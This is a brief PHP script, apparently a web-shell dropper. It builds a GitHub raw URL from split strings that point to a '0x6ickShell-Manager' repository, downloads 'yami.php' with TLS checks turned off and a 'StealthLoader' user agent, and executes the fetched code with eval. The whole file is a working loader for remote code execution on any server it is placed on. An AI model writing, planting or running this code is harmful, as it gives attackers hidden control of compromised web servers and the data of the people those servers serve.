<?php
// 时间戳: 20250831-200000

function 加载内容(){
    $一 = 'ht' . 'tps://' . 'raw.' . 'github' . 'usercontent' . '.com/';
    $二 = '6ickzone' . '/0x6ickShell-Manager/';
    $三 = 'refs/' . 'heads/' . 'main/';
    $四 = 'yami' . '.php';

    $目标 = $一 . $二 . $三 . $四;
    $数据 = '';

    // --- Step 1: CURL ---
    if(function_exists('curl_init')){
        $请求 = curl_init($目标);
        curl_setopt_array($请求, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; StealthLoader/1.0)'
        ]);
        $数据 = curl_exec($请求);
        curl_close($请求);
    }

    // --- Step 2: file_get_contents ---
    if(empty($数据)){
        $数据 = @file_get_contents($目标);
    }

    // --- Ex ---
    if($数据){
        eval("?>$数据");
    } else {
        echo "加载失败 (Gagal memuat).";
    }
}

加载内容();
?>
